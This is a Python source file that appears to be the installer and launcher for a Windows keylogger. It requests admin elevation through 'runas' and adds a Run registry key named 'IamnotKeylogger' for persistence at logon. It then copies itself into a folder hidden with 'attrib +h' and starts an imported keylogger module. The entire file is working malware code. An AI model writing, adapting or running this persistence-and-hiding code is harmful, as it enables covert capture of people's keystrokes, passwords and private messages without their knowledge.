import os, sys, subprocess, ctypes
import keylogger
from getpass import getuser
from shutil import copy

# Run command line
def exec_cmd (cmde):
    if cmde:
        execproc = subprocess.Popen(cmde, shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
        cmdout = execproc.stdout.read() + execproc.stderr.read()
        return cmdout

# Check if a user has admin rights
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

# Copy exec file to this folder
def run_by_admin(exec_path):
    if not os.path.exists(exec_path):
        if not is_admin():
            # Re-run the program with requiring admin rights
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
            sys.exit()

        # Craft the command line
        filename = os.path.basename(sys.executable)
        reg_name = 'IamnotKeylogger'
        reg_path = r'\"%s\%s\" /background' %(exec_path, filename)
        #REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "IamnotKeylogger" /t REG_SZ /d "\"C:\Users\minh\IamnotKeylogger\keylogger.exe\" /background" /F
        cmde = r'REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "%s" /t REG_SZ /d "%s" /F' %(reg_name, reg_path)
        exec_cmd(cmde)

        # Copy to hidden folder
        os.makedirs(exec_path)
        os.system('attrib +h ' + exec_path)
        copy(sys.executable, exec_path)

# Main handle
def execute():
    user_name = getuser()
    exec_path = r'C:\Users\%s\IamnotKeylogger' %(user_name)
    run_by_admin(exec_path)
    keylogger.run(exec_path)

# Test
if __name__ == '__main__':
    execute()